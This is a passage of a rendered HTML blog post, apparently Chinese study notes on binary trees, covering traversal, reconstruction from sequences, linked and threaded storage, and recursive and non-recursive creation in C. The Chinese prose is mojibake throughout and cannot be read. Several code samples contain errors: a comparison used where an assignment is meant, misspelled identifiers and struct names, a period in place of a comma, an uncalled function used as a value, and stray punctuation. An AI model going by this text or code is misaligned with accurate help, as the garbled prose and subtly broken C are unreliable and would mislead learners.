class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BinTree bt)</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)<span class="comment">//ç»“æŸé€’å½’çš„æ¡ä»¶</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    PostOrder(leftchild(bt));<span class="comment">//åæ ¹é€’å½’éå†tçš„å·¦å­æ ‘</span></span><br><span class="line">    PostOrder(rightchild(bt));<span class="comment">//åæ ¹é€’å½’éå†tçš„å³å­æ ‘</span></span><br><span class="line">    Visit(root(bt));<span class="comment">//è®¿é—®ç»“ç‚¹çš„æ•°æ®åŸŸ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>ä¸¾ä¾‹ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212211638.png"></p><h3 id="äºŒå‰æ ‘çš„å¹¿åº¦éå†ï¼ˆå±‚æ¬¡éå†ï¼‰"><a href="#äºŒå‰æ ‘çš„å¹¿åº¦éå†ï¼ˆå±‚æ¬¡éå†ï¼‰" class="headerlink" title="äºŒå‰æ ‘çš„å¹¿åº¦éå†ï¼ˆå±‚æ¬¡éå†ï¼‰"></a>äºŒå‰æ ‘çš„å¹¿åº¦éå†ï¼ˆå±‚æ¬¡éå†ï¼‰</h3><ul><li>ä»äºŒå‰æ ‘çš„ç¬¬ä¸€å±‚å¼€å§‹ï¼Œ&#x3D;&#x3D;ä»ä¸Šåˆ°ä¸‹é€å±‚éå†ï¼Œåœ¨åŒä¸€å±‚ä¸­ï¼Œä»å·¦åˆ°å³é€ä¸ªéå†&#x3D;&#x3D;</li><li>ä¼ªä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BinTree(bt))</span></span><br><span class="line">&#123;</span><br><span class="line">    åˆå§‹åŒ–é˜Ÿåˆ— q;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">while</span>(é˜Ÿåˆ—ä¸ç©º)</span><br><span class="line">    &#123;</span><br><span class="line">        å‡ºé˜Ÿå…ƒç´  p;</span><br><span class="line">        visit(p);<span class="comment">//è®¿é—®é˜Ÿå¤´ç»“ç‚¹çš„æ•°æ®åŸŸ</span></span><br><span class="line">        <span class="keyword">if</span>(leftchild(p)!=<span class="literal">NULL</span>)<span class="comment">//é˜Ÿå¤´å·¦å­©å­ä¸ä¸ºç©ºåˆ™è®©å·¦å­©å­å…¥é˜Ÿ</span></span><br><span class="line">            leftchild(p) å…¥é˜Ÿq;</span><br><span class="line">        <span class="keyword">if</span>(rightchild(p)!=<span class="literal">NULL</span>)<span class="comment">//é˜Ÿå¤´å³å­©å­ä¸ä¸ºç©ºåˆ™è®©å³å­©å­å…¥é˜Ÿ</span></span><br><span class="line">            rightchild(p) å…¥é˜Ÿq;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘çš„äº¤å‰éå†"><a href="#äºŒå‰æ ‘çš„äº¤å‰éå†" class="headerlink" title="äºŒå‰æ ‘çš„äº¤å‰éå†"></a>äºŒå‰æ ‘çš„äº¤å‰éå†</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    visit(bt);</span><br><span class="line">    InOrder(lefchild(bt));</span><br><span class="line">    InOrder(rightchild(bt));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BinTree bt)</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    PreOrder(leftchild(bt));</span><br><span class="line">    visit(bt);</span><br><span class="line">    PreOrder(rightchild(bt));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    bt = CreateBinTree();</span><br><span class="line">    PreOrder(bt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214135713.png"></p><h2 id="äºŒå‰æ ‘çš„é‡æ„"><a href="#äºŒå‰æ ‘çš„é‡æ„" class="headerlink" title="äºŒå‰æ ‘çš„é‡æ„"></a>äºŒå‰æ ‘çš„é‡æ„</h2><ul><li>ç”±éå†åºåˆ—æ¢å¤äºŒå‰æ ‘</li></ul><p>&#x3D;&#x3D;å·²çŸ¥å…ˆæ ¹åºåˆ—å’Œå¯¹ç§°åºåˆ—å¯ä»¥æ¢å¤äºŒå‰æ ‘&#x3D;&#x3D;</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214124613.png"></p><p>&#x3D;&#x3D;å·²çŸ¥å¯¹ç§°åºåˆ—å’Œåæ ¹åºåˆ—ä¹Ÿå¯ä»¥æ¢å¤äºŒå‰æ ‘&#x3D;&#x3D;</p><p>&#x3D;&#x3D;å·²çŸ¥å…ˆæ ¹åºåˆ—å’Œåæ ¹åºåˆ—å¯¹äºæ»¡äºŒå‰æ ‘å¯ä»¥æ¢å¤ï¼Œå…¶ä»–ä¸è¡Œ&#x3D;&#x3D;</p><blockquote><p>å› ä¸ºæ»¡äºŒå‰æ ‘æ¯ä¸ªç»“ç‚¹éƒ½æœ‰å·¦å­©å­å’Œå³å­©å­</p></blockquote><ul><li>å…ˆæ ¹åºåˆ—æ‰¾å·¦å­©å­</li><li>åè·Ÿåºåˆ—æ‰¾å³å­©å­</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214125338.png"></p><p>a</p><h2 id="äºŒå‰æ ‘çš„å­˜å‚¨"><a href="#äºŒå‰æ ‘çš„å­˜å‚¨" class="headerlink" title="äºŒå‰æ ‘çš„å­˜å‚¨"></a>äºŒå‰æ ‘çš„å­˜å‚¨</h2><h3 id="äºŒå‰æ ‘çš„é¡ºåºå­˜å‚¨ï¼ˆå®Œå…¨äºŒå‰æ ‘ï¼‰"><a href="#äºŒå‰æ ‘çš„é¡ºåºå­˜å‚¨ï¼ˆå®Œå…¨äºŒå‰æ ‘ï¼‰" class="headerlink" title="äºŒå‰æ ‘çš„é¡ºåºå­˜å‚¨ï¼ˆå®Œå…¨äºŒå‰æ ‘ï¼‰"></a>äºŒå‰æ ‘çš„é¡ºåºå­˜å‚¨ï¼ˆå®Œå…¨äºŒå‰æ ‘ï¼‰</h3><ul><li>ç”¨ä¸€ç»„åœ°å€è¿ç»­çš„å­˜å‚¨å•å…ƒæŒ‰å±‚æ¬¡æ¬¡åºä¾æ¬¡å­˜å‚¨çš„ç»“ç‚¹</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214143025.png"></p><h3 id="äºŒå‰æ ‘çš„é“¾å¼å­˜å‚¨ï¼ˆä¸€èˆ¬äºŒå‰æ ‘ï¼‰"><a href="#äºŒå‰æ ‘çš„é“¾å¼å­˜å‚¨ï¼ˆä¸€èˆ¬äºŒå‰æ ‘ï¼‰" class="headerlink" title="äºŒå‰æ ‘çš„é“¾å¼å­˜å‚¨ï¼ˆä¸€èˆ¬äºŒå‰æ ‘ï¼‰"></a>äºŒå‰æ ‘çš„é“¾å¼å­˜å‚¨ï¼ˆä¸€èˆ¬äºŒå‰æ ‘ï¼‰</h3><p>äºŒå‰é“¾è¡¨ï¼š</p><blockquote><p>äºŒå‰é“¾è¡¨ä¸­ï¼Œæ— æ³•é€šè¿‡ç»“ç‚¹ç›´æ¥æ‰¾åˆ°å…¶åŒäº²</p><blockquote><p>è§£å†³åŠæ³•æ˜¯åœ¨ç»“ç‚¹ä¸­å¢åŠ ä¸€ä¸ªçˆ¶ç»“ç‚¹æŒ‡é’ˆåŸŸï¼Œè½¬åŒ–ä¸ºä¸‰å‰é“¾è¡¨</p></blockquote></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214143139.png"></p><p>ç±»å‹å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTeeNode</span> *<span class="title">leftchild</span>;</span></span><br><span class="line">    structBTreeNode *rightchild;</span><br><span class="line">&#125;BinTreeNode;</span><br><span class="line"><span class="keyword">typedef</span> BinTreeNode *BinTree;</span><br></pre></td></tr></table></figure><h3 id="çº¿ç´¢äºŒå‰æ ‘"><a href="#çº¿ç´¢äºŒå‰æ ‘" class="headerlink" title="çº¿ç´¢äºŒå‰æ ‘"></a>çº¿ç´¢äºŒå‰æ ‘</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215041515.png"></p><ul><li>ç±»å‹å®šä¹‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span> *<span class="title">leftchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span> *<span class="title">rightchild</span>;</span></span><br><span class="line">    <span class="type">int</span> lthread;</span><br><span class="line">    <span class="type">int</span> rthread;</span><br><span class="line">&#125;BinTreeNode;</span><br><span class="line"><span class="keyword">typedef</span> BinTreeNode *BinTree;</span><br></pre></td></tr></table></figure><h2 id="ï¼ˆé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹ä¸éå†"><a href="#ï¼ˆé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹ä¸éå†" class="headerlink" title="ï¼ˆé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹ä¸éå†"></a>ï¼ˆé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹ä¸éå†</h2><ul><li>å»ºç«‹ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BinTree <span class="title function_">CreateBinTree_Recursion</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    BinTree bt;</span><br><span class="line">    scanf_s(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        bt == <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        bt = (BinTreeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BinTreeNode));</span><br><span class="line">        bt-&gt;data = ch;</span><br><span class="line">        bt-&gt;leftchild = CreateBinTree_Recuision();</span><br><span class="line">        bt-&gt;rightchild = CreateBinTree_Recuision();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…ˆåºéå†-1"><a href="#å…ˆåºéå†-1" class="headerlink" title="å…ˆåºéå†"></a>å…ˆåºéå†</h3><ul><li>çœŸä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder_Recursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bt-&gt;data);</span><br><span class="line">    PreOrder_Recursion(bt-&gt;leftchild);</span><br><span class="line">    PreOrder_Recursion(bt-&gt;rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸­åºéå†-1"><a href="#ä¸­åºéå†-1" class="headerlink" title="ä¸­åºéå†"></a>ä¸­åºéå†</h3><ul><li>çœŸä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder_Recursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    InOrder_Recursion(bt-&gt;leftchild);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bt-&gt;data);</span><br><span class="line">    InOrder_Recursion(bt-&gt;rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ååºéå†-1"><a href="#ååºéå†-1" class="headerlink" title="ååºéå†"></a>ååºéå†</h3><ul><li>çœŸä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder_Recursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    PostOrder_Recursion(bt-&gt;leftchild);</span><br><span class="line">    PostOrder_Recursion(bt-&gt;rightchild);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bt-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¹¿åº¦ï¼ˆå±‚æ¬¡ï¼‰éå†"><a href="#å¹¿åº¦ï¼ˆå±‚æ¬¡ï¼‰éå†" class="headerlink" title="å¹¿åº¦ï¼ˆå±‚æ¬¡ï¼‰éå†"></a>å¹¿åº¦ï¼ˆå±‚æ¬¡ï¼‰éå†</h3><ul><li>çœŸä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    BinTree p;</span><br><span class="line">    LinkQueue <span class="built_in">queue</span> = SetNullQueue_Link();<span class="comment">//åˆ›å»ºç©ºé˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    p = bt;</span><br><span class="line">    EnQueue_Link(<span class="built_in">queue</span>,bt);<span class="comment">//æ ¹ç»“ç‚¹å…¥é˜Ÿ</span></span><br><span class="line">    <span class="keyword">while</span>(!IsNullQueue_Link(<span class="built_in">queue</span>))<span class="comment">//é˜Ÿåˆ—ä¸ç©ºï¼Œå¾ªç¯æ‰§è¡Œ</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = FrontQueue_link(<span class="built_in">queue</span>);<span class="comment">//å–é˜Ÿå¤´</span></span><br><span class="line">        DeQueue_link(<span class="built_in">queue</span>);<span class="comment">//å‡ºé˜Ÿ</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;leftchld!=<span class="literal">NULL</span>)</span><br><span class="line">            EnQueue_link(<span class="built_in">queue</span>.p-&gt;leftchild);<span class="comment">//å·¦å­©å­ä¸ç©ºï¼Œå…¥é˜Ÿ</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rightchild!=<span class="literal">NULL</span>)</span><br><span class="line">            EnQueue_link(<span class="built_in">queue</span>,p-&gt;rightchild);<span class="comment">//å³å­©å­ä¸ç©ºï¼Œå…¥é˜Ÿ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ï¼ˆéé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹äºéå†"><a href="#ï¼ˆéé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹äºéå†" class="headerlink" title="ï¼ˆéé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹äºéå†"></a>ï¼ˆéé€’å½’ï¼‰äºŒå‰æ ‘çš„å»ºç«‹äºéå†</h2><ul><li><p>éé€’å½’å»ºç«‹äºŒå‰æ ‘ç®—æ³•æ€è·¯ï¼š</p><ol><li><p>å°†äºŒå‰æ ‘æ‰©å……ä¸ºå®Œå…¨äºŒå‰æ ‘ï¼Œè¾“å…¥&#x3D;&#x3D;å®Œå…¨äºŒå‰æ ‘åºåˆ—&#x3D;&#x3D;ï¼Œä»¥<code>#</code>ä¸ºç»“æŸæ ‡å¿—ï¼Œè®¾ç½®è®¡æ•°å™¨<code>count</code>ä¸º<code>-1</code>ï¼Œç”¨æ¥æ ‡å¿—ç»“ç‚¹çš„åºå·</p></li><li><p>å¦‚æœè¾“å…¥çš„ä¸æ˜¯<code>@</code>ï¼Œåˆ™ç”Ÿæˆä¸€ä¸ªæ–°çš„ç»“ç‚¹<code>s</code>ï¼Œå¹¶å¯¹ç»“ç‚¹çš„æ•°æ®åŸŸèµ‹å€¼ä¸ºè¾“å…¥çš„å­—ç¬¦ï¼Œç»“ç‚¹å·¦å³æŒ‡é’ˆåŸŸä¸ºç©ºï¼Œç»“ç‚¹<code>s</code>å…¥é˜Ÿ</p><p>å¦‚æœè¾“å…¥çš„æ˜¯<code>@</code>ï¼Œ<code>@</code>ä¹Ÿå…¥é˜Ÿï¼Œä½†ä¸ç”Ÿæˆæ–°çš„ç»“ç‚¹</p><p><code>count++</code></p></li><li><p>å¦‚æœ<code>count=0</code>ï¼Œåˆ™ç»“ç‚¹ä¸ºæ ¹ç»“ç‚¹ï¼Œè®¾ç½®äºŒå‰æ ‘çš„æ ¹<code>bt=s</code></p><p>å¦‚æœ<code>count=å¥‡æ•°</code>ï¼Œåˆ™ç»“ç‚¹ä¸ºçˆ¶ç»“ç‚¹<code>p</code>ï¼ˆé˜Ÿå¤´ç»“ç‚¹ï¼‰çš„å·¦å­©å­ï¼Œå³<code>p-&gt;leftchild=s</code>ï¼›</p><p>å¦‚æœ<code>count=å¶æ•°</code>ï¼Œåˆ™ç»“ç‚¹ä¸ºçˆ¶ç»“ç‚¹<code>p</code>ï¼ˆé˜Ÿå¤´ç»“ç‚¹ï¼‰çš„å³å­©å­ï¼Œå³<code>p-&gt;rightchild=s</code>ï¼›</p><p>é˜Ÿå¤´ç»“ç‚¹<code>p</code>å¤„ç†å®Œæ¯•ï¼Œå‡ºé˜Ÿ</p></li></ol></li><li><p>ä»£ç å®ç°ï¼š</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">BinTree <span class="title function_">CreateBinTree_NRecursion</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkQueue <span class="built_in">queue</span> = SetNullQueue_Link();<span class="comment">//è®¾ç½®ç©ºé˜Ÿåˆ—</span></span><br><span class="line">    BinTreeNode *s, *p, *bt;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">-1</span>;</span><br><span class="line">    ch = getchar();</span><br><span class="line">    bt = <span class="literal">NULL</span>;<span class="comment">//è®¾ç½®äºŒå‰æ ‘ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">while</span>(ch!=<span class="string">&#x27;#&#x27;</span>)<span class="comment">//å‡è®¾ç»“ç‚¹çš„å€¼ä¸ºå•ä¸ªå­—ç¬¦ï¼Œä»¥#ç»“æŸ</span></span><br><span class="line">    &#123;</span><br><span class="line">        s = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(ch!=<span class="string">&#x27;@&#x27;</span>)<span class="comment">//åˆ¤æ–­è¯»å…¥çš„ç‚¹æ˜¯å¦ä¸ºè™šç»“ç‚¹&#x27;@&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">            s = (BinTreeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BinTreeNode));<span class="comment">//ç”³è¯·æ–°ç»“ç‚¹ç©ºé—´</span></span><br><span class="line">            s-&gt;data = ch;<span class="comment">//æ–°ç»“ç‚¹æ•°æ®åŸŸèµ‹å€¼</span></span><br><span class="line">            s-&gt;leftchild = s-&gt;rightchild = <span class="literal">NULL</span>;<span class="comment">//æ–°ç»“ç‚¹å·¦å³æŒ‡é’ˆåŸŸç½®ç©º</span></span><br><span class="line">        &#125;</span><br><span class="line">        EnQueue_link(<span class="built_in">queue</span>,s);<span class="comment">//æ–°ç»“ç‚¹åœ°å€æˆ–è™šç»“ç‚¹åœ°å€å…¥é˜Ÿ</span></span><br><span class="line">        count++;<span class="comment">//è®¡æ•°å™¨++</span></span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bt = s;<span class="comment">//è®¡æ•°å™¨ä¸º0ï¼Œå½“å‰ç»“ç‚¹ä¸ºæ ¹ç»“ç‚¹</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = FrontQueue_link;<span class="comment">//å–é˜Ÿå¤´å…ƒç´ </span></span><br><span class="line">            <span class="keyword">if</span>(s!=<span class="literal">NULL</span>&amp;&amp;p!=<span class="literal">NULL</span>)<span class="comment">//å½“å‰ç»“ç‚¹å’ŒåŒäº²ç»“ç‚¹éƒ½ä¸ä¸ºè™šç»“ç‚¹</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(count%<span class="number">2</span> == <span class="number">1</span>)<span class="comment">//countä¸ºå¥‡æ•°ï¼Œæ–°ç»“ç‚¹ä¸ºå·¦å­©å­</span></span><br><span class="line">                    p-&gt;leftchild = s;</span><br><span class="line">                <span class="keyword">else</span> p-&gt;rightchild = s;<span class="comment">//countä¸ºå¶æ•°ï¼Œæ–°ç»“ç‚¹ä¸ºå³å­©å­</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">            Dequeue_link(<span class="built_in">queue</span>);<span class="comment">//ä¸¤ä¸ªå­©å­å¤„ç†å®Œæ¯•ï¼Œå‡ºé˜Ÿï¼Œå¤„ç†ä¸‹ä¸€ä¸ªç»“ç‚¹</span></span><br><span class="line">        &#125;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…ˆåºéå†-2"><a href="#å…ˆåºéå†-2" class="headerlink" title="å…ˆåºéå†"></a>å…ˆåºéå†</h3><ul><li>ç®—æ³•æ€è·¯ä¸€ï¼š</li></ul><p>è®©æ¯ä¸ªç»“ç‚¹éƒ½è¿›æ ˆå‡ºæ ˆä¸€æ¬¡ï¼Œå…ˆå°†æ ¹ç»“ç‚¹å‹å…¥æ ˆä¸­ï¼Œå¦‚æœæ ˆä¸ç©ºï¼Œå¼¹å‡ºä¸€ä¸ªå…ƒç´ ä¾æ¬¡è®¿é—®å…¶å³å­©å­å’Œå·¦å­©å­ï¼Œå†é‡å¤åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©ºï¼Œä¸ç©ºåˆ™å‡ºæ ˆå°†å…¶å³å·¦å­©å­å…¥æ ˆï¼Œç›´åˆ°æ ˆç©ºä¸ºæ­¢</p><ul><li>ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder_NRecursion1</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStack lstack;</span><br><span class="line">    lstack = SetNullStack_Link();</span><br><span class="line">    BinTreeNode *p;</span><br><span class="line">    Push_link(lstack,bt);<span class="comment">//æ ¹ç»“ç‚¹å…¥æ ˆ</span></span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_link(lstack))</span><br><span class="line">    &#123;</span><br><span class="line">        p = Top_link(lstack);<span class="comment">//å¼¹å‡ºå…¥æ ˆç»“ç‚¹è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rightchild)</span><br><span class="line">            Push_link(lstack,p-&gt;rightchild);<span class="comment">//å³å­æ ‘ä¸ç©ºï¼Œè¿›æ ˆ</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;leftchild)</span><br><span class="line">            Push_link(lstack,p-&gt;leftchild);<span class="comment">//å·¦å­æ ‘ä¸ç©ºï¼Œè¿›æ ˆ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•æ€è·¯ä¸€ï¼š</li></ul><p>å³å­©å­å…¥æ 